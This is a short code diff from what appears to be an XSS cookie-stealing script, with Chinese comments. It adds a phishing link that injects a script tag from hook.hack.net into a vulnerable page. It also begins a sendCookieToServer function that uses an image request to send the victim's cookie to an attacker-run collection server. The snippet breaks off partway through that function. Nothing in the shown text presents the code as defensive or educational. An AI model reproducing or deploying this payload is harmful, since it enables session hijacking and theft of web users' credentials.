@@ -13,8 +13,10 @@ http://collect.hack.net/xss_hook2email.php # 通过hook 站点收集信息的站
 */
 
 
-// XSS Hook Cookie
 // 钓鱼网站包含超链接 http://target.vulhost.com/xss.php?id=<script src=http://hook.hack.net/xss_hook.js></script>
+
+// XSS Hook Cookie
+// 钓鱼网站包含超链接 http://target.vulhost.com/xss.php?id=<script src=http://hook.hack.net/xss_hook_cookie.js></script>
 function sendCookieToServer() {
     //制作一个图片，图片连接即讲过cookie 发给服务端
     var img = new Image();
